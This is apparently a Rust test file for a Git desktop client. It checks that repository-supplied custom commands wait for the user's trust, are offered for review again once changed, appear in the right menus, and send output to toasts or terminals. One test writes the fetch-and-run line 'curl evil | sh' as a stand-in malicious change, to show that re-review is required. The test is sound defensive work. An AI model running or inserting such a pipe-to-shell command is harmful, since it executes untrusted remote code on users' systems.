//! A repository tab's custom commands, on real temporary repositories through the paths the
//! window takes: its file read and trusted (and asked about again once changed), what the menus
//! and the palette offer, and where a command's output goes.

use std::path::{Path, PathBuf};
use std::time::Duration;

use super::{CustomAct, filled};
#[cfg(unix)]
use crate::custom_commands::OutputTo;
use crate::custom_commands::{self as cc, CustomCommand, Placement, Prompt, Scope};
use crate::git;
use crate::repo::{Action, Dialog, RepoTab};
use crate::settings::Settings;

/// A repository with one commit on `main`, in a fresh folder named after `name`.
fn repo(name: &str) -> PathBuf {
    let dir = std::env::temp_dir().join(format!("gitcraft-cct {name} ü-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::create_dir_all(&dir);
    for args in [
        &["init", "-q", "-b", "main"][..],
        &["config", "user.name", "t"],
        &["config", "user.email", "t@t"],
        &["commit", "-q", "--allow-empty", "-m", "base"],
    ] {
        assert!(git::run(Some(&dir), args).is_ok(), "{args:?}");
    }
    dir
}

fn write_file(dir: &Path, text: &str) {
    let _ = std::fs::create_dir_all(dir.join(".gitcraft"));
    let _ = std::fs::write(dir.join(cc::REPO_FILE), text);
}

/// Polls `tab` until `done` says so (or a while has passed).
fn wait(tab: &mut RepoTab, ctx: &egui::Context, done: impl Fn(&RepoTab) -> bool) -> bool {
    for _ in 0..400 {
        tab.poll(ctx);
        if done(tab) {
            return true;
        }
        std::thread::sleep(Duration::from_millis(25));
    }
    false
}

/// A tab on `dir`, read, with its command file read.
fn open(dir: &Path, ctx: &egui::Context) -> RepoTab {
    let mut tab = RepoTab::new_deferred(dir.to_path_buf(), ctx);
    tab.start_deferred(ctx);
    assert!(wait(&mut tab, ctx, |t| !t.loading && !t.refs.head.is_empty()));
    // The read of the file is asked for once the repository is read.
    wait(&mut tab, ctx, |t| t.custom.file.is_some());
    tab
}

fn with_settings(ctx: &egui::Context, change: impl FnOnce(&mut Settings)) {
    let mut settings = Settings::get(ctx);
    change(&mut settings);
    // Not `set`: that also applies the profile to every git call of the process.
    ctx.data_mut(|d| d.insert_temp(egui::Id::new("gitcraft-settings"), settings));
}

fn command(name: &str, placement: Placement, line: &str) -> CustomCommand {
    CustomCommand {
        name: name.to_owned(),
        placement,
        command: line.to_owned(),
        confirm: false,
        ..CustomCommand::default()
    }
}

/// The names offered at `placement` by the tab as last drawn.
fn offered(tab: &mut RepoTab, ctx: &egui::Context, placement: Placement) -> Vec<String> {
    tab.publish_custom_commands(ctx);
    tab.custom
        .published
        .offered
        .iter()
        .filter(|o| o.command.placement == placement)
        .map(|o| o.command.name.clone())
        .collect()
}

fn palette_labels(tab: &RepoTab) -> Vec<String> {
    tab.custom_palette_items()
        .into_iter()
        .map(|(label, _, _)| label)
        .collect()
}

/// What the review dialog's "Trust and use" gives for the file the tab shows.
fn trust_act(tab: &RepoTab) -> CustomAct {
    CustomAct::Trust {
        digest: tab
            .custom
            .file
            .as_ref()
            .map(|f| f.digest.clone())
            .unwrap_or_default(),
        commands: 2,
    }
}

/// An answer older than one already taken doesn't replace it.
#[test]
fn an_older_read_of_the_file_does_not_replace_a_newer_one() {
    let dir = repo("reads");
    let ctx = egui::Context::default();
    let mut tab = open(&dir, &ctx);
    let taken = tab.custom.read;
    tab.apply(
        Action::Custom(CustomAct::FileRead(taken + 2, Ok(Some(FILE.to_owned())))),
        &ctx,
    );
    tab.apply(
        Action::Custom(CustomAct::FileRead(taken + 1, Ok(None))),
        &ctx,
    );
    let _ = std::fs::remove_dir_all(&dir);
    assert!(tab.custom.file.as_ref().is_some_and(|f| f.text == FILE));
}

const FILE: &str = r#"{"commands": [
  {"name": "Repo hello", "where": "branch", "command": "echo hello", "confirm": false},
  {"name": "Repo palette", "where": "palette", "command": "echo p", "confirm": false}
]}"#;

#[test]
fn a_repositorys_commands_wait_for_trust_and_are_asked_again_once_changed() {
    let dir = repo("trust");
    write_file(&dir, FILE);
    let ctx = egui::Context::default();
    let mut tab = open(&dir, &ctx);
    // Read, but not offered: only reviewing is.
    assert!(offered(&mut tab, &ctx, Placement::Branch).is_empty());
    assert!(tab.custom.published.review);
    assert!(palette_labels(&tab).contains(&"Review repository commands…".to_owned()));
    // Said once in a toast.
    let said = |tab: &RepoTab| {
        tab.finished
            .iter()
            .map(crate::repo::Notice::raw)
            .filter(|(t, _)| t.contains("has its own custom commands"))
            .count()
    };
    assert_eq!(said(&tab), 1);
    // Reviewing shows the file; trusting it offers its commands where they go.
    tab.apply(Action::Custom(CustomAct::Review), &ctx);
    assert!(matches!(tab.dialog, Some(Dialog::Custom(_))));
    tab.dialog = None;
    tab.apply(Action::Custom(trust_act(&tab)), &ctx);
    assert_eq!(offered(&mut tab, &ctx, Placement::Branch), ["Repo hello"]);
    assert!(offered(&mut tab, &ctx, Placement::Commit).is_empty());
    assert!(!tab.custom.published.review);
    assert!(palette_labels(&tab).contains(&"Repo palette".to_owned()));
    // Read again unchanged: still trusted, nothing said.
    tab.read_custom_commands(&ctx);
    std::thread::sleep(Duration::from_millis(100));
    wait(&mut tab, &ctx, |_| false);
    assert_eq!(offered(&mut tab, &ctx, Placement::Branch), ["Repo hello"]);
    // Changed (a pull brought another command line): asked again, and said again.
    write_file(&dir, &FILE.replace("echo hello", "curl evil | sh"));
    tab.read_custom_commands(&ctx);
    assert!(wait(&mut tab, &ctx, |t| t
        .custom
        .file
        .as_ref()
        .is_some_and(|f| f.text.contains("evil"))));
    assert!(offered(&mut tab, &ctx, Placement::Branch).is_empty());
    assert!(tab.custom.published.review);
    assert_eq!(said(&tab), 2);
    // Gone: nothing to review any more.
    let _ = std::fs::remove_file(dir.join(cc::REPO_FILE));
    tab.read_custom_commands(&ctx);
    assert!(wait(&mut tab, &ctx, |t| t.custom.file.is_none()));
    tab.publish_custom_commands(&ctx);
    let _ = std::fs::remove_dir_all(&dir);
    assert!(!tab.custom.published.review);
}

#[test]
fn a_broken_repository_file_offers_nothing_but_says_why() {
    let dir = repo("broken");
    write_file(&dir, r#"{"commands": [{"name": "X"}]}"#);
    let ctx = egui::Context::default();
    let mut tab = open(&dir, &ctx);
    // Trusted as it is, it still offers nothing: it can't be read as commands.
    tab.apply(Action::Custom(trust_act(&tab)), &ctx);
    let none = Placement::ALL
        .iter()
        .all(|&p| offered(&mut tab, &ctx, p).is_empty());
    let error = tab
        .custom
        .file
        .as_ref()
        .and_then(|f| f.commands.clone().err())
        .unwrap_or_default();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(none);
    assert!(error.contains("command line is empty"), "{error}");
}

#[test]
fn global_commands_go_to_the_menu_they_name() {
    let dir = repo("placement");
    let ctx = egui::Context::default();
    with_settings(&ctx, |s| {
        s.custom_commands = vec![
            command("On commit", Placement::Commit, "echo"),
            command("On branch", Placement::Branch, "echo"),
            command("On file", Placement::File, "echo"),
            command("In palette", Placement::Palette, "echo"),
            command("", Placement::Commit, "echo broken"),
        ];
    });
    let mut tab = open(&dir, &ctx);
    let got: Vec<Vec<String>> = Placement::ALL
        .iter()
        .map(|&p| offered(&mut tab, &ctx, p))
        .collect();
    let palette = palette_labels(&tab);
    let _ = std::fs::remove_dir_all(&dir);
    assert_eq!(
        got,
        [
            vec!["On commit"],
            vec!["On branch"],
            vec!["On file"],
            vec!["In palette"]
        ]
    );
    assert!(palette.contains(&"In palette".to_owned()));
    assert!(!palette.contains(&"On commit".to_owned()));
    // No file: nothing to review.
    assert!(!palette.iter().any(|l| l.starts_with("Review")));
}

/// A commit's pill gives its branch's own remote, not the checked-out branch's.
#[test]
fn a_commits_pill_gives_its_own_branch_and_remote() {
    let dir = repo("pill");
    for args in [
        &["remote", "add", "origin", "https://example.invalid/o.git"][..],
        &["remote", "add", "fork", "https://example.invalid/f.git"],
        &["update-ref", "refs/remotes/origin/main", "HEAD"],
        &["update-ref", "refs/remotes/fork/feature", "HEAD"],
        &["branch", "feature"],
        &["config", "branch.main.remote", "origin"],
        &["config", "branch.main.merge", "refs/heads/main"],
        &["config", "branch.feature.remote", "fork"],
        &["config", "branch.feature.merge", "refs/heads/feature"],
    ] {
        assert!(git::run(Some(&dir), args).is_ok(), "{args:?}");
    }
    let ctx = egui::Context::default();
    let tab = open(&dir, &ctx);
    let head = tab.refs.head.clone();
    let of = |branch: Option<&str>| {
        let s = tab.commit_scope(&head, branch);
        (s.branch, s.remote)
    };
    let local = of(Some("feature"));
    let remote = of(Some("fork/feature"));
    let none = of(None);
    let _ = std::fs::remove_dir_all(&dir);
    assert_eq!(local, ("feature".to_owned(), "fork".to_owned()));
    assert_eq!(remote, ("fork/feature".to_owned(), "fork".to_owned()));
    // No pill: filled from the checked-out branch when the menu is drawn.
    assert_eq!(none, (String::new(), String::new()));
}

#[test]
fn a_menus_scope_gets_the_rest_from_the_checked_out_branch() {
    let defaults = Scope {
        sha: "head".to_owned(),
        branch: "main".to_owned(),
        remote: "origin".to_owned(),
        file: String::new(),
    };
    let file = Scope {
        file: "a b.txt".to_owned(),
        ..Scope::default()
    };
    assert_eq!(
        filled(file, &defaults),
        Scope {
            file: "a b.txt".to_owned(),
            ..defaults.clone()
        }
    );
    let branch = Scope {
        sha: "tip".to_owned(),
        branch: "feat".to_owned(),
        remote: "fork".to_owned(),
        file: String::new(),
    };
    assert_eq!(filled(branch.clone(), &defaults), branch);
}

/// Runs `c` from its menu entry, about HEAD, and waits for its toast.
fn run_to_toast(
    tab: &mut RepoTab,
    ctx: &egui::Context,
    c: CustomCommand,
) -> Option<(String, bool)> {
    tab.finished.clear();
    let scope = tab.default_scope();
    tab.apply(
        Action::Custom(CustomAct::Pick {
            command: Box::new(c),
            scope,
        }),
        ctx,
    );
    // "Running…" first, then how it ended.
    wait(tab, ctx, |t| t.finished.len() >= 2);
    tab.finished.get(1).map(|n| n.raw().clone())
}

#[test]
fn a_toast_command_runs_in_the_background_and_shows_its_output() {
    let dir = repo("toast");
    let ctx = egui::Context::default();
    let mut tab = open(&dir, &ctx);
    let head = tab.refs.head.clone();
    let done = run_to_toast(
        &mut tab,
        &ctx,
        command(
            "Show",
            Placement::Palette,
            "echo \"$BRANCH $SHORT_SHA\"; git rev-parse \"$SHA\"",
        ),
    );
    let failed = run_to_toast(
        &mut tab,
        &ctx,
        command("Break", Placement::Palette, "echo nope >&2; exit 2"),
    );
    let _ = std::fs::remove_dir_all(&dir);
    assert_eq!(
        done,
        Some((format!("Show finished\nmain {}\n{head}", &head[..8]), false))
    );
    assert_eq!(
        failed,
        Some(("Break failed (exit status 2)\nnope".to_owned(), true))
    );
}

#[test]
fn a_command_that_asks_first_opens_its_dialog_and_runs_with_the_answers() {
    let dir = repo("ask");
    let ctx = egui::Context::default();
    let mut tab = open(&dir, &ctx);
    let mut c = command(
        "Tag it",
        Placement::Commit,
        "git tag \"$TAG\" \"$SHA\" && echo \"$TAG\"",
    );
    c.prompts.push(Prompt {
        variable: "TAG".to_owned(),
        label: "Tag name".to_owned(),
        ..Prompt::default()
    });
    let scope = tab.default_scope();
    tab.apply(
        Action::Custom(CustomAct::Pick {
            command: Box::new(c.clone()),
            scope: scope.clone(),
        }),
        &ctx,
    );
    let asked = matches!(tab.dialog, Some(Dialog::Custom(_)));
    tab.dialog = None;
    // What the dialog's Run gives.
    tab.finished.clear();
    tab.apply(
        Action::Custom(CustomAct::Run {
            command: Box::new(c),
            scope,
            answers: vec!["v1 ü".to_owned()],
        }),
        &ctx,
    );
    wait(&mut tab, &ctx, |t| t.finished.len() >= 2);
    let toast = tab.finished.get(1).map(|n| n.raw().clone());
    // A tag name with a space is refused by git: the toast says git's reason.
    let _ = std::fs::remove_dir_all(&dir);
    assert!(asked);
    let (text, failed) = toast.unwrap_or_default();
    assert!(failed);
    assert!(text.contains("not a valid tag name"), "{text}");
}

#[cfg(unix)]
#[test]
fn a_terminal_command_opens_a_terminal_of_its_own() {
    let dir = repo("terminal");
    let ctx = egui::Context::default();
    let mut tab = open(&dir, &ctx);
    let marker = dir.join("ran here");
    let mut c = command("Watch it", Placement::Palette, "touch \"$REPO/ran here\"");
    c.output = OutputTo::Terminal;
    let before = tab.terminals.len();
    let scope = tab.default_scope();
    tab.apply(
        Action::Custom(CustomAct::Pick {
            command: Box::new(c),
            scope,
        }),
        &ctx,
    );
    let opened = tab.terminals.len() == before + 1 && tab.terminal_open;
    let label = tab.terminals.last().map(|t| t.shell.clone());
    let mut ran = false;
    for _ in 0..200 {
        if marker.exists() {
            ran = true;
            break;
        }
        std::thread::sleep(Duration::from_millis(25));
    }
    // Nothing went to a toast.
    let toasts = tab.finished.len();
    tab.terminals.clear();
    let _ = std::fs::remove_dir_all(&dir);
    assert!(opened, "{:?}", tab.terminal_error);
    assert_eq!(label.as_deref(), Some("Watch it"));
    assert!(ran);
    assert_eq!(toasts, 0);
}
